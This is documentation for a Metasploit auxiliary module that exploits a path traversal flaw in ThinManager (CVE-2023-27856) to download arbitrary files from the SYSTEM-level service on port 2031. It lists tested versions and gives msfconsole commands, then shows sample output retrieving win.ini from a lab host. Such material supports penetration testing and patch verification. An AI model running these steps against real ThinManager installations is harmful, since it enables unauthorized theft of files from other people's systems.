## Vulnerable Application

This module exploits a path traversal vulnerability in ThinManager <= v13.0.1 (CVE-2023-27856) to download an arbitrary file from the
system.

The affected service listens by default on TCP port 2031 and runs in the context of NT AUTHORITY\SYSTEM.

**Limitation**: Some files may get mangled by the application during transit.

## Testing

The software can be obtained from
[the vendor](https://thinmanager.com/downloads/).

**Successfully tested on**

- ThinManager v13.0.1 on Windows 22H2
- ThinManager v13.0.0 on Windows 22H2
- ThinManager v12.1.5 on Windows 22H2
- ThinManager v11.1.4 on Windows 22H2
- ThinManager v10.0.2 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/gather/thinmanager_traversal_download 
msf6 auxiliary(gather/thinmanager_traversal_download) > set RHOSTS <IP>
msf6 auxiliary(gather/thinmanager_traversal_download) > set FILE <file to download>
msf6 auxiliary(gather/thinmanager_traversal_download) > run
```

This should retrieve the file as specified through FILE from the remote server.

## Options

### FILE
The file to download from the remote server.

## Scenarios

Running the exploit against ThinManager v13.0.1 on Windows 22H2 should result in an output similar to the following:

```
msf6 auxiliary(gather/thinmanager_traversal_download) > run
[*] Running module against 192.168.137.227

[*] 192.168.137.227:2031 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.137.227:2031 - The service is running, but could not be validated.
[*] 192.168.137.227:2031 - Sending handshake...
[*] 192.168.137.227:2031 - Received handshake response.
[*] 192.168.137.227:2031 - Requesting /Windows/win.ini from 192.168.137.227
[+] 192.168.137.227:2031 - Received response from target.
[*] 192.168.137.227:2031 - File saved as loot: /home/asdf/.msf4/loot/20250506150022_default_192.168.137.227_thinmanager.file_334213.txt
[*] Auxiliary module execution completed

msf6 auxiliary(gather/thinmanager_traversal_download) > cat /home/asdf/.msf4/loot/20250506150027_default_192.168.137.227_thinmanager.file_381967.txt
[*] exec: cat /home/asdf/.msf4/loot/20250506150027_default_192.168.137.227_thinmanager.file_381967.txt

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
